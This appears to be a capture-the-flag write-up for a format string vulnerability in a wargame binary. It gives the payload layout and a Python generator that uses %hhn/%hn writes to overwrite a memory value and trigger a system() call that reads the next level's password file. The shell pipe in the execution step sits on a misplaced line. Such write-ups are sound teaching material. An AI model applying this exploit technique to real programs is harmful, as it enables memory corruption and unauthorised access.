## Level4 - Format String Vulnerability
Binary reads 512 bytes, passes to printf(buffer) without validation. Must write 0x1025544 to address 0x8049810 to trigger system("/bin/cat /home/user/level5/.pass").

### Vulnerability
- Function `p()`: printf(buffer) with user input (format string vulnerability)
- Allows arbitrary memory reads/writes via format string specifiers

### Target
Write 0x1025544 to 0x8049810 (little-endian: 0x44 0x55 0x02 0x01)

### Exploitation: Byte-by-Byte Writes using %hhn
Use %hhn (1-byte writes) instead of %hn (2-byte writes) to keep payload small:
1. Write 0x44 (68 decimal) to 0x8049810 using %12$hhn
2. Write 0x55 (85 decimal) to 0x8049811 using %13$hhn
3. Write 0x0102 (258 decimal) to 0x8049812 using %14$hn

### Payload Structure (278 bytes total)
```
[12 bytes: 3 addresses at 0x8049810, 0x8049811, 0x8049812]
[56 bytes: padding] > total 68, write %12$hhn
[17 bytes: padding] > total 85, write %13$hhn
[173 bytes: padding] > total 258, write %14$hn
```

### Execution
```bash
python3 << 'EOF'
import struct
payload = (struct.pack('<I', 0x8049810) + struct.pack('<I', 0x8049811) +
           struct.pack('<I', 0x8049812) + b'A'*56 + b'%12$hhn' + b'A'*17 +
           b'%13$hhn' + b'A'*173 + b'%14$hn')
import sys; sys.stdout.buffer.write(payload)
EOF
 | /home/user/level4/level4
```

### Key Insights
- %hhn writes 1 byte (character count mod 256)
- Character count must increase: 68 < 85 < 258 (no backward jumps)
- Payload fits in 512-byte fgets buffer
- All three writes execute successfully, magic value written, system() triggered
